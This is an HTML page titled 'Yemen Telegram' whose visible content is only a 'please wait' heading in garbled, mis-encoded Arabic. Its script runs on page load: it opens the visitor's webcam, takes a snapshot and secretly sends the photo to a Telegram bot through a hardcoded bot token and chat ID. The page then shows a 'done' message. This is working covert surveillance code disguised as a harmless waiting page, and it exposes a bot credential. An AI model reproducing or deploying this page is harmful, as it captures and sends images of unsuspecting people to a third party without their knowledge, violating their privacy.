<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Yemen Telegram</title>
</head>
<body>
        <h2>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±.</h2>

  <script>
    // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨ÙˆØª
    const botToken = "6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w";
    const chatId   = "-1002819450502";

    window.onload = async function() {
      try {
        // ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video  = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        // Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ø­ØªÙ‰ ØªÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        await new Promise(res => setTimeout(res, 1500));

        // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø©
        const canvas = document.createElement('canvas');
        canvas.width  = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);

        // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§ Ù„Ù„Ø¨ÙˆØª
        canvas.toBlob(async (blob) => {
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("photo", blob, "snapshot.jpg");
          formData.append("caption", "ğŸ“¸ ØµÙˆØ±Ø© Ù…Ù„ØªÙ‚Ø·Ø©");

          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData
          });

          // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
          stream.getTracks().forEach(track => track.stop());

          // ØªØºÙŠÙŠØ± ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„ØµÙØ­Ø©
          document.body.innerHTML = "<h2>âœ… ØªÙ… </h2>";
        }, "image/jpeg");

      } catch (err) {
        console.error("Ø®Ø·Ø£:", err);
        alert("âŒ Ù„Ù… ÙŠØªÙ….");
      }
    };
  </script>
</body>
</html>
